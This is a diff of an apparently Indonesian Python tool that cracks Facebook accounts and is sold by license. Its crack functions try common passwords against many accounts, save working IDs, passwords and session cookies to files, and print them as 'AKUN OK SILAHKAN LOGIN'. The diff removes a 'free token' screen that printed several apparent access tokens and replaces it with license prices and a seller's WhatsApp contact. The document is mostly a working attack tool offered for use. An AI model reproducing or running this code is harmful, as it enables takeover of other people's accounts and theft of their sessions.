@@ -31,7 +31,7 @@ from rich import print as cetak
 from rich.markdown import Markdown as mark
 from rich.columns import Columns as col
 try:ugen = open('user.txt','r').read().splitlines()
-except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
+except:ugen = ['Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; U; Android 2.1-update1; en-us; Nexus One Build/ERE27) AppleWebkit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17','Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1','Mozilla/5.0 (Linux; U; Android 1.5; en-dk; HTC Magic Build/CUPCAKE) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1','Mozilla/5.0 (Linux; U; Android 2.1-update1; fr-fr; desire_A8181 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17']
 try:ugen2 = open('user2.txt','r').read().splitlines()
 except:ugen2 =  ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
 
@@ -100,11 +100,11 @@ def banner():
 
 def memek():
 	kontol()
-	print('%s 1. 𝑻𝒐𝒌𝒆𝒏 𝑮𝒓𝒂𝒕𝒊𝒔 '%(H))
+	print('%s 1. 𝑫𝒂𝒇𝒕𝒂𝒓 𝑯𝒂𝒓𝒈𝒂 𝑳𝒊𝒄𝒆𝒏𝒔𝒊 '%(H))
 	print('%s 2. 𝑳𝒐𝒈𝒊𝒏 𝑲𝒆 𝑺𝒄𝒓𝒊𝒑𝒕 '%(B))
 	yu = input('\033[33m𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑷𝒊𝒍𝒊𝒉 : ')
 	if yu in ['1','01']:
-	  token_gratis()
+	  harga_licensi()
 	if yu in ['2','02']:
 	  login()
 
@@ -530,7 +530,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['sayang','bangsat','sayang123','bismillah','anjing','katasandi','indonesia','doraemon']
+			pwv = ['sayang','bangsat','sayang123','bismillah','anjing','katasandi','sayangku','doraemon']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -644,24 +644,24 @@ def crack(idf,pwv):
 					ceker(idf,pw)
 				else:
 					print('\n')
-					statuscp = f'>_ID       : {idf} >_PASSWORD : {pw}'
+					statuscp = f'ID       : {idf} PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='>_Checkpoint'))
+					cetak(nel(statuscp1, title='Checkpoint'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
+				headapp={"user-agent":"Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF"}
 				if 'no' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title=' >_OK COY'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -724,9 +724,9 @@ def crack(idf,pwv):
 								hit2+=1
 					else:pass
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}\nCOOKIES  : {kuki}\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='OK'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 
 
@@ -813,9 +813,9 @@ def crack3(idf,pwv):
 					ceker(idf,pw)
 				else:
 					print('\n')
-					statuscp = f'>_ID : {idf} >_PASSWORD : {pw}'
+					statuscp = f'ID : {idf} PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='>_Checkpoint'))
+					cetak(nel(statuscp1, title='Checkpoint'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -827,9 +827,9 @@ def crack3(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}\nCOOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='>_OK CUY'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 				elif 'ya'in taplikasi:
 					ok+=1
@@ -892,9 +892,9 @@ def crack3(idf,pwv):
 								hit2+=1
 					else:pass
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}\nCOOKIES  : {kuki}\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='>_OK CUY'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 
 			else:
@@ -926,24 +926,24 @@ def crack4(idf,pwv):
 					ceker(idf,pw)
 				else:
 					print('\n')
-					statuscp = f'>_ID       : {idf} >_PASSWORD : {pw}'
+					statuscp = f'ID       : {idf} PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='>_Checkpoint'))
+					cetak(nel(statuscp1, title='Checkpoint'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
+				headapp={"user-agent":"Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF"}
 				if 'no' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title=' >_OK COY'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1006,9 +1006,9 @@ def crack4(idf,pwv):
 								hit2+=1
 					else:pass
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}\nCOOKIES  : {kuki}\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='OK'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 
 
@@ -1062,9 +1062,9 @@ def crack5(idf,pwv):
 					ceker(idf,pw)
 				else:
 					print('\n')
-					statuscp = f'>_ID : {idf} >_PASSWORD : {pw}'
+					statuscp = f'ID : {idf} PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='>_Checkpoint'))
+					cetak(nel(statuscp1, title='Checkpoint'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -1076,9 +1076,9 @@ def crack5(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}\nCOOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='>_OK CUY'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 				elif 'ya'in taplikasi:
 					ok+=1
@@ -1141,9 +1141,9 @@ def crack5(idf,pwv):
 								hit2+=1
 					else:pass
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}\nCOOKIES  : {kuki}\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='>_OK CUY'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 
 			else:
@@ -1210,9 +1210,9 @@ def crack6(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}\nCOOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='>_OK CUY'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 				elif 'ya'in taplikasi:
 					ok+=1
@@ -1275,9 +1275,9 @@ def crack6(idf,pwv):
 								hit2+=1
 					else:pass
 					print('\n')
-					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
+					statusok = f'ID       : {idf}\nPASSWORD : {pw}\nCOOKIES  : {kuki}\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='>_OK CUY'))
+					cetak(nel(statusok1, title='AKUN OK SILAHKAN LOGIN'))
 					break
 
 			else:
@@ -1403,7 +1403,7 @@ def janda_sebalah():#line:42
 """)#line:49
     OOO00O0OOO00OO00O =input (f"{H}[{P}?{H}]{P} 𝑪𝒉𝒐𝒐𝒔𝒆 :{K} ")#line:50
     if OOO00O0OOO00OO00O in ['1','01']:#line:51
-      print (f"{H}[{P}!{H}]{P} Send Message..");time .sleep (3 );os .system ('xdg-open https://wa.me/6282290885204?text=Bang+Ada+Api+Key+Gratis+Ngak+?');exit ()#line:52
+      print (f"{H}[{P}!{H}]{P} Send Message..");time .sleep (3 );os .system ('xdg-open https://wa.me/6282290885204?text=Bang+Mau+Beli+Api+Key+Harganya+Berapa+Yah+?');exit ()#line:52
     elif OOO00O0OOO00OO00O in ['2','02']:#line:53
       O000O000OOO000OOO =input (f"{H}[{P}?{H}]{P} 𝑨𝒑𝒊 𝑲𝒆𝒚 :{K} ")#line:54
       if len (O000O000OOO000OOO )==0 :#line:55
@@ -1586,18 +1586,23 @@ def main():
         thread.start()
         
 		
-def token_gratis():
+def harga_licensi():
 	clear()
 	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
-	print("""%s \33[1;32m 𝑺𝑰𝑳𝑨𝑯𝑲𝑨𝑵 𝑫𝑰 𝑨𝑴𝑩𝑰𝑳  """%(h))
-	print("""%s \33[1;32m 𝑴𝑨𝑲𝑨𝑺𝑰𝑯 𝑺𝑼𝑫𝑨𝑯 𝑴𝑬𝑴𝑨𝑲𝑨𝑰 𝑻𝑶𝑳𝑳𝑺 𝑺𝑨𝒀𝑨 """%(h))
+	print("""%s \33[1;33m 𝑫𝒂𝒇𝒕𝒂𝒓 𝑯𝒂𝒓𝒈𝒂 𝑳𝒊𝒔𝒆𝒏𝒔𝒊  """%(h))
+	print("""%s \33[1;33m 𝑼𝒏𝒕𝒖𝒌 𝑴𝒆𝒏𝒈𝒈𝒖𝒏𝒂𝒌𝒂𝒏 𝑻𝒐𝒐𝒍𝒔 𝑺𝒕𝒓𝒐𝒗𝒎𝒊𝒓𝒗𝒊𝒂𝒔𝒌𝒂 """%(h))
 	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
-	print("""%s \33[1;33m\nEAABsbCS1iHgBAKNJF1ZAMH6SXHFIrwWLpPyoRxsaxbKz7BUb8ozNRZArLtr9WZCe8kPUzwxZB3BRFTzd6BsyKjCXcJQxwSyfelVsfVQkT3fIGuoB8nL3Bhez5sJpkWapEFo1ZBS274aVPoQObFdO0zAb0sIDwfWr6C4XNDlke9nCdrP5ZBL8ZB5 """%(h))
-	print("""%s \33[1;33m\n\nEAABsbCS1iHgBADvC8POMgY7VF14f52GXuKG5rTw5NEQbfnL7fI0oZAeCCv8Q8ohtLDWMtfZBZCrpV80z2DCdrjbhGFhZAYOdmJmbXy5EY2nlMrqXo5ArXnQISyZAUzCBlyMZCDYPyAQ6Icamsw883vadxzoDimX6FsBFwE2ZCiG8wZDZD """%(h))
-	print("""%s \33[1;33m\n\nEAABsbCS1iHgBAHQG0VcFwLEZA5KxI81sWbtffb01NGDfTUIshEZBZAimVJzL9OWmcx6ZCwvNZAep1Xdf0wDTZABFaoisQJnPAmeeCJn5JCy40thXIijNeLwYU0ZBiol5b4JbplZA8quXZAsBeydf6ZBNdE0LEC7sqzyehUtUQeg7WGZBTQMQk0K5PLi """%(h))
-	print("""%s \33[1;33m\n\nEAABsbCS1iHgBAIt0p6xycxmK5XZAQbVCVuBOsIJTJ1ZCZAKnR2oXnh70KfO9iAf23MSyEfeofvj8hezylywA54yqUUHazvLEJZCK0XxZCdqJypkFUrs90rbWEvw1TvWIXt2ZCKmAU4gxI5erMJQ7ZBMw5nWfIqOtoOb59NML3EuZCLi7aw9ZBUK5x """%(h))
-	print("""%s \33[1;33m\n\nEAABsbCS1iHgBAF2El6dIVMH6L5uWPVn4th6vRjUUkABPAdRvfIbZCyZBqOxVQUEZBDoMMwHzzjAENkgBsNYQavdsiTlcCBa2bwz7dbrG3PZClX2pFWJbLHnDuYKrCh8YXVwyGePBntX6jCcyUiMqP4BzWfJZBFyq5YiVYJpPdAwZDZD """%(h))
-	print("""%s \33[1;33m\n\nEAABsbCS1iHgBACi23luB3rXpkQtaxs8CudZBPlieKZCZCMYnBJZBxmF3bQmi1Gp9Pb0bwgHpvXqqKoNtacjgbTtn70aoFGrqyZApVySEpDWhLMV4s6wkztXbzrCHdQytXVm3WwXLYVWVnsA5jM1FyfBZAB8wZBHeUrcL0W7J6fIOAZDZD """%(h))
+	print("""%s \33[1;96m\n\n𝟏. 𝑻𝒓𝒊𝒂𝒍 𝟑 𝑯𝒂𝒓𝒊 : 𝐑𝐩. 𝟓.𝟎𝟎𝟎 """%(h))
+	print("""%s \33[1;96m\n\n𝟐. 𝑻𝒓𝒊𝒂𝒍 𝟏 𝒎𝒊𝒏𝒈𝒈𝒖 : 𝐑𝐩. 𝟏𝟎.𝟎𝟎𝟎 """%(h))
+	print("""%s \33[1;96m\n\n𝟑. 𝑻𝒓𝒊𝒂𝒍 𝟏 𝒃𝒖𝒍𝒂𝒏 : 𝐑𝐩. 𝟐𝟓.𝟎𝟎𝟎 """%(h))
+	print("""%s \33[1;96m\n\n𝟒. 𝑻𝒓𝒊𝒂𝒍 𝟐 𝒃𝒖𝒍𝒂𝒏 : 𝐑𝐩. 𝟓𝟎.𝟎𝟎𝟎 """%(h))
+	print("""%s  ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
+	print("""%s \33[1;32m 𝑯𝒂𝒓𝒈𝒂 𝑨𝒌𝒂𝒏 𝑩𝒆𝒓𝒖𝒃𝒂𝒉  """%(h))
+	print("""%s \33[1;32m 𝑲𝒆𝒕𝒊𝒌𝒂 𝑻𝒐𝒐𝒍𝒔 𝑨𝒅𝒂 𝑷𝒆𝒎𝒃𝒂𝒓𝒖𝒂𝒏 𝑩𝒆𝒔𝒂𝒓 """%(h))
+	print("""%s \33[1;32m 𝑼𝒏𝒕𝒖𝒌 𝑷𝒆𝒎𝒆𝒔𝒂𝒏𝒂𝒏 𝑳𝒊𝒔𝒆𝒏𝒔𝒊 𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑪𝒉𝒂𝒕 𝑨𝒅𝒎𝒊𝒏  """%(h))
+	print("""%s \33[1;32m 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : 𝑻𝒆𝒅𝒅𝒚 𝑪𝒂𝒉𝒚𝒐 𝑷𝒖𝒕𝒓𝒂 𝑷𝒂𝒏𝒈𝒆𝒎𝒃𝒂𝒓𝒂  """%(h))
+	print("""%s \33[1;32m 𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑 : 𝟎𝟖𝟐𝟐𝟗𝟎𝟖𝟖𝟓𝟐𝟎𝟒  """%(h))
+	print("""%s  ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
 	exit()
                         
 if __name__=='__main__':
